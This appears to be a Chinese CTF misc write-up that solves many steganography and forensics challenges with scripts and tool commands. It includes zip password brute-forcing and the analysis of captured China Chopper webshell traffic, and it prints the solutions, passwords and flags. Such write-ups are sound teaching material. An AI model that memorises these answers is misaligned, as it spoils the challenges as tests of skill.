C:\\Users\\12521\\Desktop\\syclovergeek.mp3.txtthe bit stream file C:\\Users\\12521\\Desktop\\syclovergeek.mp3 is a BINARY fileHDR: s=FFF, id=1, l=3, ep=off, br=9, sf=0, pd=1, pr=0, m=0, js=0, c=0, o=0, e=0alg.=MPEG-1, layer=III, tot bitrate=128, sfrq=44.1mode=stereo, sblim=32, jsbd=32, ch=2[Frame 5932]Frame cannot be locatedInput stream may be emptyAvg slots/frame = 417.962; b/smp = 2.90; br = 128.001 kbpsDecoding of &quot;C:\\Users\\12521\\Desktop\\syclovergeek.mp3&quot; is finishedThe decoded PCM output file name is &quot;C:\\Users\\12521\\Desktop\\syclovergeek.mp3.pcm&quot; FRA04 godwave使用脚本进行转化。 123456789101112131415161718192021222324import waveimport matplotlib.pyplot as pltimport numpyimport oswav = wave.open(&#x27;/root/桌面/11/godwave.wav&#x27;,&#x27;rb&#x27;)params = wav.getparams()nchannels, sampwidth, framerate, nframes = params[:4]strData = wav.readframes(nframes)waveData = numpy.fromstring(strData, dtype=numpy.int16)waveData = waveData*1.0/(max(abs(waveData)))string = &#x27;&#x27;norm = 0for i in range(1735680): norm = norm+abs(waveData[i]) if (i+1) % 64 == 0: if norm &gt; 10: string += &#x27;1&#x27; else: string += &#x27;0&#x27; norm = 0with open(&#x27;01output.txt&#x27;,&#x27;w&#x27;) as output: output.writelines(string) 拿到一串二进制，进行曼切斯特解密，八个一组转换为ascii，发现是一张png，扫码拿到flag。 1234567891011121314151617181920212223242526272829# -*- coding: utf-8 -*-file_in = open(&#x27;01output.txt&#x27;,&#x27;r&#x27;)code = file_in.readline()file_in.close()le = len(str(code))print leprint coderesult = &#x27;&#x27;count = 0res = 0while code != &#x27;&#x27;: cp = code[:2] if cp != &#x27;&#x27;: if cp[0] == &#x27;0&#x27; and cp[1] == &#x27;1&#x27;: res = (res&lt;&lt;1)|0 count +=1 if cp[0] == &#x27;1&#x27; and cp[1] == &#x27;0&#x27;: res = (res&lt;&lt;1)|1 count +=1 if count == 8: result += chr(res) count = 0 res = 0 else: print &#x27;Unexpected cp, exit!&#x27; # found &#x27;00&#x27; or &#x27;11&#x27;, stop the script directly break code = code[2:]print(result) FRA06 Ogrewatch那个一个文件不知道后缀名，使用Linux查看一下，放入linux之后可以直接打开是一个视频，但不是mp4格式。 12root@root:~&#x2F;桌面&#x2F;flag# file &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;ogreman&#39; &#x2F;root&#x2F;桌面&#x2F;flag&#x2F;ogreman: Matroska data 百度了一下是一个MKV文件，也是视频格式的一种，在win下修改后缀为mkv。使用ffmpeg 提取文件。分理出一个文件使用命令提取flag。 12ffmpeg -i ogreman -map 0:s:0 ogreman-subs.srtgrep &quot;font size&quot; ogreman-subs.srt | cut -d&quot;&gt;&quot; -f2 蓝鲸安全杂项我们不一样一张图片，提示我们，尝试binwalk拿到一样的图片。不一样需要进行比较，可以使用stegsolve，但是没有发现什么东西。 尝试kali–compare。 1root@root:~&#x2F;桌面&#x2F;flag# compare &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;1.png&#39; &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;2.png&#39; out.png 拿到一张图片有异常，在图的左下角，有一块红色区域。使用python将这两个图片不一样的部分的像素打印出来。 123456789101112131415161718from PIL import Imageimport randomimg1 = Image.open(&quot;00000000.png&quot;)im1 = img1.load()img2 = Image.open(&quot;00006909.png&quot;)im2 = img2.load()a=&#x27;&#x27;i=0s=&#x27;&#x27;for y in range(img1.size[1]): for x in range(img1.size[0]): if(im1[x,y]!=im2[x,y]): print(im1[x,y],im2[x,y]) 输出 123456(1, 0, 42) (1, 0, 1)(1, 0, 42) (1, 0, 1)(2, 1, 43) (2, 1, 1)(2, 1, 43) (2, 1, 1)(2, 1, 43) (2, 1, 0)(2, 1, 43) (2, 1, 1) 发现rgb的b通道都是0或者1，提取出来八个一组转化为二进制。 1234567891011121314151617181920212223from PIL import Imageimport randomimg1 = Image.open(&quot;1.png&quot;)im1 = img1.load()img2 = Image.open(&quot;2.png&quot;)im2 = img2.load()a=&#x27;&#x27;i=0s=&#x27;&#x27;flag=&quot;&quot;flag1=&quot;&quot;for y in range(img1.size[1]): for x in range(img1.size[0]): if(im1[x,y]!=im2[x,y]): flag+=str(im2[x,y][2])print(flag)for i in range(0,len(flag),8): flag1+=chr(int(flag[i:i+8],2))print(flag1) 拿到flag。 BuuCtf杂项金三胖1root@root:~&#x2F;桌面&#x2F;flag&#x2F;1# convert aaa.gif flag.png 从分理出的图片拿到flag。 二维码扫码提示secret is here。 binwalk分离拿到一个压缩包，名字为4number暴力破解拿到密码7639。 N种方法解决拿到一个exe程序，直接root@root:~/桌面/flag# strings &#39;/root/桌面/flag/output/zip/KEY.exe&#39; 。 拿到一个图片base64，放入浏览器解码。是个二维码扫描得到flag。 大白直接PNG修改高度。 你竟然赶我走binwalk分离不出东西来，直接strings，拿到flag。 基础破解一个压缩包题目提示破解，四位数字，拿到密码之后，打开是base64解码拿到flag。 ZmxhZ3s3MDM1NDMwMGE1MTAwYmE3ODA2ODgwNTY2MWI5M2E1Y30= 乌镇峰会种图strings命令拿到flag。 LSB提示LSB直接使用kali的zsteg。 123root@root:~/桌面/flag# zsteg &#x27;/root/桌面/flag/output/zip/flag11.png&#x27; imagedata .. text: &quot;00010,&amp;&amp;\\&quot;&quot;b1,rgb,lsb,xy .. file: PNG image data, 280 x 280, 8-bit/color RGB, non-interlaced 可以看到rgb的lsb通道有一个PNG，直接上stegsolve，使用save bin功能，不要用save Text功能，保存为1.png。拿到二维码扫描得到flag。 文件中的秘密文件属性拿到flag。 wireshark直接过滤http流量，找到一个登录界面拿到flag。 ningen拿到一张图片，为jpg，提示密码是四位数字，想到steghide，但是不会爆破，binwalk分析，有一个zip，尝试foremost分离，分离出好多的文件夹，就是没有文件，尝试dd命令，拿到压缩包，爆破密码，拿到flag。 1root@root:~&#x2F;桌面&#x2F;flag&#x2F;output# dd if&#x3D;&#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;1.jpg&#39; of&#x3D;flag.zip skip&#x3D;38689 bs&#x3D;1 镜子里面的世界png图片直接上zsteg。 1root@root:~&#x2F;桌面&#x2F;flag&#x2F;output# zsteg &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;steg.png&#39; 123456789101112meta date:create .. text: &quot;2013-01-17T17:35:32-05:00&quot;meta date:modify .. [same as &quot;meta date:create&quot;]imagedata .. text: &quot;\\&quot;&amp;&amp;\\&quot;4&amp;$&gt;8:&quot;b1,rgb,lsb,xy .. text: &quot;Hey I think we can write safely in this file without anyone seeing it. Anyway, the secret key is: st3g0_saurus_wr3cks&quot;b2,r,msb,xy .. text: [&quot;U&quot; repeated 178 times]b2,g,msb,xy .. text: [&quot;U&quot; repeated 178 times]b2,b,msb,xy .. text: [&quot;U&quot; repeated 178 times]b2,rgb,msb,xy .. text: [&quot;U&quot; repeated 22 times]b2,bgr,msb,xy .. text: [&quot;U&quot; repeated 22 times]b4,r,msb,xy .. text: [&quot;w&quot; repeated 100 times]b4,g,msb,xy .. file: MPEG ADTS, layer I, v2, 112 kbps, JntStereob4,b,msb,xy .. text: [&quot;w&quot; repeated 100 times] 被嗅探的流量提示找文件，打开文件，查看总体协议分级。有http流量，直接过滤http。 右键-&gt;显示分组字节流-&gt;显示为图像。对图片strings命令拿到flag。 小明的保险箱使用string命令，可以看到有RAR文件。 12345root@root:~&#x2F;桌面&#x2F;flag&#x2F;output# strings &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;1.jpg&#39; Rar!2.txt~fi#E-s%n foremost分离拿到rar，爆破拿到flag。 爱因斯坦拿到一个图片，binwalk分离得到一个压缩包，需要密码。strings jpg，看到有&lt;?xpacket begin=信息，说明图片属性有信息，查看图片属性发现一个字符串，作为密码解压拿到flag。 一个流量包，打开之后发现只有TCP协议，协议分析发现也带有数据(Data)。 接着查看每个数据包，发现有的数据包有Data字段，第一个为F，第二个为L。正好是flag字段，尝试tshark提取。 1steady@steady:~$ tshark -r easycap.pcap -T fields -e &quot;data.data&quot; | tr &quot;\\n&quot; &quot; &quot; | sort -u 截取到十六进制，转ascii拿到flag。 另外一个世界strings图片，末尾有二进制数据，查看长度为56，为八的倍数，直接转化字符串，得到flag。 12345steady=&quot;01101011011011110110010101101011011010100011001101110011&quot;flag=&quot;&quot;for i in range(0,len(steady),8): flag+=chr(int(steady[i:i+8],2))print(flag) 1koekj3s FLAGpng图片。 1root@root:~/桌面/flag# zsteg &#x27;/root/桌面/flag/2.png&#x27; 12345root@root:~&#x2F;桌面&#x2F;flag# zsteg &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;2.png&#39; --allimagedata .. text: &quot;KK&lt;220\\r\\r&quot;b1,rgb,lsb,xy .. file: Zip archive data, at least v2.0 to extractb1,bgr,msb,xy .. text: &quot;saZ$S:&#39;6&quot;b2,r,msb,xy .. file: PGP\\011Secret Sub-key - 有zip文件，stegsolve提取出来，有一个没有后缀的文件。 放入winhex，发现是个ELF文件。 假如给我三天光明盲文拿到密码，拿到一个音频。音频是一个短杠、长杆，短杠为.，长杠为-。拿到莫斯解码，拿到flag。 1-.-. - ..-. .-- .--. . .. ----- ---.. --... ...-- ..--- ..--.. ..--- ...-- -.. --.. 隐藏的密码12root@root:~&#x2F;桌面&#x2F;flag# strings &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;隐藏的钥匙.jpg&#39; | grep &quot;flag&quot;flag:base64:(Mzc3Y2JhZGRhMWVjYTJmMmY3M2QzNjI3Nzc4MWYwMGE&#x3D;) [BJDCTF 2nd]最简单的misc-y1ng伪加密，解压一个没有后缀的文件，放入。winhex，有点像PNG，但是缺少头加入89 50 4E 47 0D 0A 1A 0A。 一定要注意，不能先修改文件后缀，要在原始的文件上修改，然后在修改名字。拿到一串数字。 1424A447B79316E677A756973687561697D 一开始以为是md5，尝试十六进制解码，拿到flag。 [BJDCTF 2nd]A_Beautiful_Picturezsteg分析没有信息，尝试binwalk，分理出一个图片，在linux打开打不开，提示CRC有问题。但是在win上可以打开。肯定是CRC爆破。 12345678910111213141516import structimport binasciiimport osp=0m = open(&quot;1.png&quot;,&quot;rb&quot;).read()for i in range(5000): if(p==1): break for j in range(5000): c = m[12:16] + struct.pack(&#x27;&gt;i&#x27;, i) + struct.pack(&#x27;&gt;i&#x27;, j)+m[24:29] crc = binascii.crc32(c) &amp; 0xffffffff if crc == 0xC2C143B3: p=1 #print(c) print(hex(i),hex(j)) break 一定要查看CRC值，然后修改脚本，别忘了修改。 神秘龙卷风爆破压缩包，解密brainfuck解码。 宽带信息泄露RouterPassView解密。 来首歌曲1..... -... -.-. ----. ..--- ..... -.... ....- ----. -.-. -... ----- .---- ---.. ---.. ..-. ..... ..--- . -.... .---- --... -.. --... ----- ----. ..--- ----. .---- ----. .---- -.-. 莫斯密码，拿到flag。 数据包中的线索打开分析协议，有http协议，发现有数据，很多字符，最有有一个=，考虑base64图片，加入头放入浏览器显示错误。 直接解密base64，转化为图片拿到flag。 九连环binwalk 分理出压缩包，伪加密，拿到两个压缩包。拿到一张图片，尝试setghide。 123steghide.exe extract -sf C:\\Users\\12521\\Desktop\\good-已合并.jpgEnter passphrase:wrote extracted data to &quot;ko.txt&quot;. 拿到另一个压缩包密码，解密拿到flag。 1bV1g6t5wZDJif^J7 面具下的flagbinwalk 分离出一个vmdk文件，使用7z解压，拿到文件，文件中有brainfuck，解密。 flag&#123;N7F5_AD5。 另一半在文件where_is_flag_part_two.txt中，但是提示flag不在这里，很可能是ntf隐写。使用7z压缩也你能看到具有隐写数据。使用工具提取隐写数据，是ook编码，直接解码拿到flag。 刷新过的图片提示刷新，F5隐写。 1234567java Extract C:\\Users\\12521\\Desktop\\Misc.jpgHuffman decoding startsPermutation starts309504 indices shuffledExtraction startsLength of embedded file: 190 bytes(1, 31, 5) code used 拿到一个压缩包，伪加密，拿到flag。 梅花香之苦寒来strings分析一下，最后末尾有十六进制。 1root@root:~&#x2F;桌面&#x2F;flag# strings &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;meihuai.jpg&#39; | grep &quot;7312c31&quot; &gt; q.txt 放入notepadd++，十六进制转换ascii。一群坐标画图 ，可以使用脚本，也可以使用kali的gnuplot,主要该工具去需要去掉（）、以及逗号变成空格。 1gnuplot&gt; plot &#39;&#x2F;root&#x2F;q.txt&#39; [BJDCTF 2nd]圣火昭昭-y1ngjpg文件，stings看到有图片附加属性直接，查看找到编码諸壽隸僧壽降吽壽諸壽陀壽摩隸僧缽薩願心壽咤壽囉寂壽闍諸壽哆壽慧壽聞壽色吽愍壽所壽蜜如，解码拿到密码。gemlovecom,根据题目提示去掉com。 jpg、拿到密码。想到steghide、jphsiwn都不好使，最后outguess解密。 1root@root:~&#x2F;桌面&#x2F;flag# outguess -k &quot;gemlove&quot; -r &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;sheng_huo_zhao_zhao.jpg&#39; .&#x2F;out.txt 菜刀666 提示菜刀，应该与链接shell有关直接，搜索http流量，追踪TCP，第七个流可以看到，z2参数是一个图片的十六进制。 1FFD8FFE000104A46494600010101007800780000FFDB00430001010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101FFDB00430101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101FFC0001108013901E203012200021101031101FFC4001F0000010501010101010100000000000000000102030405060708090A0BFFC400B5100002010303020403050504040000017D01020300041105122131410613516107227114328191A1082342B1C11552D1F02433627282090A161718191A25262728292A3435363738393A434445464748494A535455565758595A636465666768696A737475767778797A838485868788898A92939495969798999AA2A3A4A5A6A7A8A9AAB2B3B4B5B6B7B8B9BAC2C3C4C5C6C7C8C9CAD2D3D4D5D6D7D8D9DAE1E2E3E4E5E6E7E8E9EAF1F2F3F4F5F6F7F8F9FAFFC4001F0100030101010101010101010000000000000102030405060708090A0BFFC400B51100020102040403040705040400010277000102031104052131061241510761711322328108144291A1B1C109233352F0156272D10A162434E125F11718191A262728292A35363738393A434445464748494A535455565758595A636465666768696A737475767778797A82838485868788898A92939495969798999AA2A3A4A5A6A7A8A9AAB2B3B4B5B6B7B8B9BAC2C3C4C5C6C7C8C9CAD2D3D4D5D6D7D8D9DAE2E3E4E5E6E7E8E9EAF2F3F4F5F6F7F8F9FAFFDA000C03010002110311003F00FC18823DB907E62481211D6493F86143D914E012BCF5E30056C4310192E7D0CC40EFFC30478E3B0DFF00FD8F352DA3DBB0AF0769F2C1FF00964839699CF3866C9C11CF719E33AD6F1B7C840EB930AB71C672D7327B0C1D99EC0632179FF49A8C75F376FF002FB9DFAD9BE65D66EDFE56D79EFADBB3D9AB5BE4AC95FB69D5455EDC28724C9C703CD238D89FC30A1F523AE3D4F6539D88632E4EE013080CA57FE58C5FC31A7FD34933F377E7DCD54B78F714DA0B00711038F9DC7DF9DFFD95E703FA6EAD98101D8A83702FF20FF9ED3779187FCF34391CF5F539AF568C36EFDF7BAD36F5BBDBBE9F146DE3D79F4DDAFBAFA2F93D1EFA2B35B4657B90A6428036314F7C5BC1F967CC7DDCF7391D0B1C6CDBA6D0BB70A4292B9FF963177918FF00CF47E3033B88C6324A8AAB020551D24F9B1EF7336781D4131A13C738C7BB606BDBC4064B82FF0030DF8EB34BD5635C7F021C671DBA0C9435EA528EDE56FF0087D3F357B745A42FE4566B5F3EFADB656B3F5B5B4ECDABD465BB78CFC85540620B421B811A1FBD7327FB47036E4F5E47DD4AD7B78F732141F2AFFA856EE73FBCB993B0C6D2573C63D81354E14C96DDF32EE5F39971FBC906365B45D72A300311C71E8A2B6A353921B19E3CE65FE151F72DA3C74E061B6F4C73F74E7D6A11DB4ED7B697DBEE4ADD3E1B69750478D5A5ABD6FA7E76F4BEEBD6FAD9CED1B70A9F9047F30DC7C956E3CD9070F3B8FEEA9FBBBBD30790D5A70C61400079997C2E7ADCCFD0B9C9E638B2703EEFA9059B15E24DBB830D8DB479C47FCB284E36C080E7E77380D9FA1CE18D694319272C446760DDD48B780F0101EF2CB9C63A9CF62C71D96D52D36DBB256F5B7CF6B59E91A89F0DDEBAE8DAEFEF6D6775BEFBADEF74BDEA76B3146A796CBA87191D4DCDC765F689339EA3D7A30AD2452C4863B81606661FF2DA5FE18131D634E99E871C7F05578D1890061095C8E9FE8D6F9E588FF9EB27FDF4739C7231A50AE31B1761DA7C90DD228BF8E77E9991F1F29FCB036D633F5BEB6DB7DBBBBBED67D1D9FC53B1DAD6FCB5F77B2E8F5D34D2F1D234D132A80AE1B9191F6865C7CEF91E5DAC479000C00D8E383D768274228FEF997E5F957CF2BFC080FC96B10E992061B1C7639C1CD6817E68D93E5C026DD58E3681FEB2EE5E31938F97F4E0569449911845DDC9F20360177FE3BA9472768C1DBBB8E3BED6AC65E7E49F7D96BFD6AEFDE7A5C6EBF0FD2FDED64BD15B4BAA7EFCF1A925B71F2C8502523FE5DE0E36DBC7C9FDEC9FC407AF3D58D68C719C8C811B6C191DAD6D880428FF00A6D367A9E72D83C9E2181154290BBF2FFB907ACF3FF14CF9CFEEE3C9DBDB8C673BB1A10A0C8209972FC64737574739FF00B631E7BFB74DD9ACDAEB7F56AFBBB79BE8FA6FAB5ACA08B4ECBBF65F774FD1EBF65E91A97B51272368F2D8A7C993C5B5B7F148DEB2C808E7A927B6401A502636140148563086E9145FC7732678DCDD573CF1D32AA6ABC49B465BF7A0BE6423ADD5C725625EE618F8071818E9D462FA2E776FF9BE651315FF0096B20FB96D191C045230D8F4CE385AC24EDAAFC7A256D55BBFE9A69185ED6AD2FBBF0EFD3A6BFCD696B29DA68D598C6B12F393F6753D80FF0059792FE5F213D303070B83A512AA04D8371DC7C80DFF002D661F7EE65CF444E4A0ED800F462628D02EFDE493F2FDA5978FFAE76916327A0F9B1C0E49CEDE6F221258B9DA428F3D97FE5945C7976B1FFB4C461B1CF639C3679DEFE9AF6B6DF75B97ABD1AEBC8EF69A6D6FDD6FAEDF377BF6D6FD1CD5A7823CED0BFBD01C9894FF00CBD5CE7E69E4073FB 保存之后是一个密码。 第九个流最后数据返回包是一个压缩包。 12-&gt;|PK...........KQ...4...(.......flag.txtC......cS...J..Ea.v....&amp;e$K..2%..$..,..&#x3D;.J..1p..p46.PK..?..........KQ...4...(.....$....... .......flag.txt. .........J. ..p.. .o2.p.. .o2.p..PK..........Z...Z.....well,you need passwd!.|&lt;- |&lt;-是菜刀的标志，十六进制标志为2D3E7C。 [BJDCTF2020]认真你就输了[BJDCTF 2nd]EasyBaBa拿到一个图片，文件大小很大，所以直接foremost。拿到一个压缩包，解压里面还有个jpg图片。打开之后发现损坏，放入winhex，尝试修补头，但是发现是个avi文件。视频隐写。 1ffmpeg -i flag.mp4 -f image2 image%d.jpg 扫描二维码得到flag。 [SWPU2019]神奇的二维码扫码，假flag。binwalk分析。 12345678steady@steady:~&#x2F;桌面&#x2F;steady$ binwalk -e &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;BitcoinPay.pngDECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 PNG image, 400 x 400, 8-bit&#x2F;color RGBA, non-interlaced28932 0x7104 RAR archive data, version 5.x29034 0x716A RAR archive data, version 5.x94226 0x17012 RAR archive data, version 5.x 其中一个文件–YXNkZmdoamtsMTIzNDU2Nzg5MA==解码asdfghjkl1234567890，另一个压缩包的密码，得到一个jpg。 flag.doc文件，一串很长的字符串，Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVjBaS2RHVkdXbFpOYWtFeFZtcEJlRll5U2tWVWJHaG9UV3N3ZUZadGNFZFpWMDE1VTJ0V1ZXSkhhRzlVVjNOM1pVWmFjVkZ0UmxSTmF6RTFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1pFWlNUbFpVVmtwV2JURXdWakZXZEZOc1dsaGlSa3BZV1ZkMGQyUnNjRmRYYlVaclVsUkdWbFpYZUZOVWJVWTJVbFJHVjJFeVVYZFdha1pYWkVaT2NscEdhR2xTTW1ob1YxZDBZVll3TUhoalJscFlZbFZhY2xWcVFURlNNVlY1VFZSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwV1JWcHlWVEJhVDJOc2NFaGpSazVYVWpOb2IxWXhaRFJWTVVsNVZXNU9XR0pIVWxsWmJGWmhZMnhXY1ZGVVJsTk5WMUo1VmpJMWExWXdNVVZTYkdSYVRVWmFNMVpxU2t0V1ZrcFpXa1p3YkdFelFrbFdiWEJIVkRKU1YxWnVUbGhpVjJoeldXeG9iMkl4V25STldHUlZUV3RzTlZWdGRHdGhiRXAwVld4c1dtSkdXbWhaTW5oWFl6RldjbHBHWkdsU2JrSmFWMnhXYjJFeFdYZE5WVlpUWVRGd1YxbHJXa3RUUmxweFUydGFiRlpzV2xwWGExcDNZa2RGZWxGcmJGaFhTRUpJVmtSS1UxWXhXblZVYkdocFZqTm9WVlpHWTNoaU1sSnpWMjVTVGxkSFVsWlVWM1J6VGxaV2RHUkhkRmhTTUhCSlZsZDRjMWR0U2tkWGJXaGFUVlp3YUZwRlpGTlRSa3B5VGxaT2FXRXdjRWxXYlhCTFRrWlJlRmRzYUZSaE1sSnhWVzB4TkdGR1ZYZGhSVTVUVW14d2VGVXlkR0ZpUmxwelUyeHdXbFpXY0hKV1ZFWkxWMVpHY21KR1pGZE5NRXBKVm10U1MxVXhXWGhYYmxaV1lsZG9WRmxZY0ZkbGJHUllaVWM1YVUxWFVraFdNalZUVkd4T1NHRkdRbFppVkVVd1ZtcEdVMVp0UmtoUFZtaFRUVWhDTlZaSGVHRmpNV1IwVTJ0a1dHSlhhR0ZVVnpWdlYwWnNObEpzWkdwaVNFSklWMnRrYzFVeVNuSlRiVVpYVFc1b1dGbHFTa1psUm1SWldrVTFWMVpzY0ZWWFYzUnJWVEZzVjFWc1dsaGliVkp6V1d0YWQyVkdWblJOVldSVlRXdHdSMVl5ZUhkWGJGcFhZMGRvV21FeVVrZGFWM2hIWTIxS1IxcEdaRTVOUlhCS1ZtMTBVMU14VlhoWFdHaFlZbXhhVmxsclpHOWpSbHB4VkcwNWEySkdjRWhXYlRBMVZXc3hXRlZ1Y0ZkTmFsWk1WakJrUzFOR1ZuUlNiR1JvWVRGd1NWWkhkR0ZaVm1SSVZXdG9hMUl5YUhCVmJHaENaREZhYzFwRVVtcE5WMUl3VlRKMGIyRkdTbk5UYkdoVlZteHdNMVl3V25KbFJtUnlaRWR3YVZacmNFbFdiR1EwWVRKR1YxTnVVbEJXUlRWWVZGYzFiMWRHYkhGVGExcHNVbTFTV2xkclZURldNVnB6WTBaV1dGWXpVbkpXVkVaelZqRldjMWRzYUdsaVZrcDZWMWQwWVdReVZrZFdibEpPVmxkU1ZsUlhkSGRTTVZsNVpVaGtXR0pHY0ZoWk1HaExWakZhUmxkcmVGZE5WbkJJV1RJeFMxSXhjRWRhUlRWT1VsaENTMVp0TVRCVk1VMTRWbGhvV0ZkSGFGbFpiWGhoVm14c2NscEhPV3BTYkhCNFZrY3dOVll4V25SVmJHaFhWak5OTVZaWGMzaFhSbFp5WVVaa1RtRnNXbFZXYTJRMFdWWktjMVJ1VG1oU2JGcFlWRlJLYjFOV1draGxSMFphVm0xU1IxUnNXbUZWUmxwMFZXczVXbFpGTlVSVWJGcGhVMGRXU0ZKdGNFNVdNVWwzVmxSS01HRXhaRWhUYkdob1VqQmFWbFp1Y0Zka2JGbDNWMjVPVDJKRmNIcFhhMlIzWVZaT1JsTnJiRmhXYkZweVdYcEdWbVF3TVVsaFJrNW9Za2hDV1ZkV1pEQmtiVkY0VjJ4V1UySkdjSE5WYlRGVFRWWlZlV042UmxkTlZuQjZXVEJhVjFkR1duTlRhMmhoVWtWYWNsVnFTa3RUVmxKMFlVWk9iR0pZYUZGV2ExcGhXVmRSZVZaclpGZGliRXBQVm14a1UxWXhVbGhrU0dSWFRWZDRlVlpYTVVkWFJrbDNWbXBTV2sxR1NsQldha3BIWTJ4a2NtVkdaR2hoTTBKUlZsUkNhMUl4U1hsU2EyaHBVbXMxY0ZsVVFuZE5iRnAwVFZSQ1ZrMVZNVFJXVm1oelZsWmtTR1ZHV2xwV1JWb3pXVlZhVjJOV1RuUlBWbVJUWWtWd1dsWkhlR3BPVmxsNFYyNU9hbEpYYUZsV2ExVXhaR3hzVjFaWWFGaFNiRm94V1RCYWExUnNXWGxoUkVwWFlXdEtjbFY2Um10V01WcDFVMnhDVjJKSVFuZFdiWFJYVm0xUmVGZHVSbEppVlZwaFZtMHhVMU5XV2xoa1J6bG9UVlZzTlZsVmFFTldiVXBJWVVWT1lWSkZXbWhaZWtaM1VsWldkR05GTlZkTlZXd3pWbXhTUzAxSFNYbFNhMlJVWW1zMVZWbHNWbUZXYkZwMFpVaGtUazFXY0hsV01qRkhZV3hhY21ORVJsaGhNWEJRVmtkNFlXTnRUa1ZXYkdSVFRUSm9iMVpyVWt0U01WbDRWRzVXVm1KRlNsaFZiRkpYVjFaa1YxVnJaR3ROYTFwSVZqSjRWMVV5UlhoalNFNVdZbFJHVkZwWGVITldiR1J6Vkcxb1UxWkZXalpXVkVreFlURlplRmRZY0ZaaVYyaFhXbGQwWVZsV2NGWlhiR1JxVFd0YVIxUXhXbXRoUjFaelYycGFWMDFYVVhkWFZtUlNaVlphY2xwR1pHbGlSWEJRVm0xNGExVXhXWGhWYkdoclUwZFNXRlJXV25kTlJtdDNXa1ZrV0ZJd2NFaFpNRnB2VjJzeFNGVnVXbGROYm1ob1ZqQmFWMk5zY0VoU2JHUlhUVlZ3VWxac1pIZFRNVTE0VTFoc1UyRXlVbTlWYlhoTFZrWmFjMkZGVGxSTlZuQjRWVzB4UjFack1WWk5WRkpYVm0xb2VsWnNXbXRUUjBaSVlVWmFUbEp1UW05V2JURTBZekpPYzFwSVNtdFNNMEpVV1d0YWQwNUdXbGhOVkVKT1VteHNORll5TlU5aGJFcFlZVVpvVjJGck5WUldSVnB6VmxaR1dXRkdUbGRoTTBJMlZtdGtORmxXVlhsVGExcFlWMGhDV0Zac1duZFNNVkY0VjJ0T1ZtSkZTbFpVVlZGM1VGRTlQUT09。 循环base64解密，拿到第二个comEON_YOuAreSOSoS0great，使用改密码解压一个文件夹拿到一个good.MP3。 对于good文件，先导出文件，然后使用工具，拿到莫斯密码。导出文件。 使用工具解码。 12345678910111213141516171819202122steady@steady:~$ morse2ascii /home/steady/桌面/steady/_BitcoinPay.png.extracted/55.wavMORSE2ASCII 0.2by Luigi Auriemmae-mail: aluigi@autistici.orgweb: aluigi.org- open /home/steady/桌面/steady/_BitcoinPay.png.extracted/55.wav wave size 577010 format tag 1 channels: 1 samples/sec: 8000 avg/bytes/sec: 16000 block align: 2 bits: 16 samples: 288505 bias adjust: -162 volume peaks: -23125 23125 normalize: 9642 resampling to 8000hz- decoded morse data:tt ttt ete eee e ee eee eeet e ete tett eeet e ete tett e et eee tett t换-，e换.，转码得morseisveryveryeasy，即flag。 [BJDCTF2020]你猜我是个啥根据题目名称。 12steady@steady:~$ file &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;_BitcoinPay.png.extracted&#x2F;flag.zip&#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;_BitcoinPay.png.extracted&#x2F;flag.zip: PNG image data, 245 x 256, 8-bit&#x2F;color RGBA, non-interlaced 修改PNG后缀，一个二维码。扫描假flag。 使用strings查看到flag。 [BJDCTF2020]一叶障目CRC爆破修改高度。 123456789101112131415161718192021222324252627282930#coding=utf-8import zlibimport struct#读文件file = &#x27;1.png&#x27; #注意，1.png图片要和脚本在同一个文件夹下哦~fr = open(file,&#x27;rb&#x27;).read()data = bytearray(fr[12:29])crc32key = eval(str(fr[29:33]).replace(&#x27;\\\\x&#x27;,&#x27;&#x27;).replace(&quot;b&#x27;&quot;,&#x27;0x&#x27;).replace(&quot;&#x27;&quot;,&#x27;&#x27;))#crc32key = 0xCBD6DF8A #补上0x，copy hex value#data = bytearray(b&#x27;\\x49\\x48\\x44\\x52\\x00\\x00\\x01\\xF4\\x00\\x00\\x01\\xF1\\x08\\x06\\x00\\x00\\x00&#x27;) #hex下copy grep hexn = 4095 #理论上0xffffffff,但考虑到屏幕实际，0x0fff就差不多了for w in range(n):#高和宽一起爆破 width = bytearray(struct.pack(&#x27;&gt;i&#x27;, w))#q为8字节，i为4字节，h为2字节 for h in range(n): height = bytearray(struct.pack(&#x27;&gt;i&#x27;, h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] #print(data) crc32result = zlib.crc32(data) if crc32result == crc32key: print(width,height) #写文件 newpic = bytearray(fr) for x in range(4): newpic[x+16] = width[x] newpic[x+20] = height[x] fw = open(file+&#x27;.png&#x27;,&#x27;wb&#x27;)#保存副本 fw.write(newpic) fw.close 使用binwalk分离。 1234567891011root@root:~&#x2F;桌面&#x2F;flag# binwalk -e ezbb_r.png DECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 JPEG image data, JFIF standard 1.0130 0x1E TIFF image data, big-endian, offset of first image directory: 828673 0x7001 End of Zip archiveroot@root:~&#x2F;桌面&#x2F;flag# dd if&#x3D;&#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;ezbb_r.jpg&#39; of&#x3D;flag.zip skip&#x3D;28673 bs&#x3D;1记录了22+0 的读入记录了22+0 的写出 可以看到有压缩包，进而使用dd命令。但是分离出来的压缩包是错误的。 使用strings命令没有发现，直接拖入winhex查看原因，搜索FFD9或者504B，发现jpg结尾有一个504B，修改后面的值为zip压缩头，解压拿到一个文件。 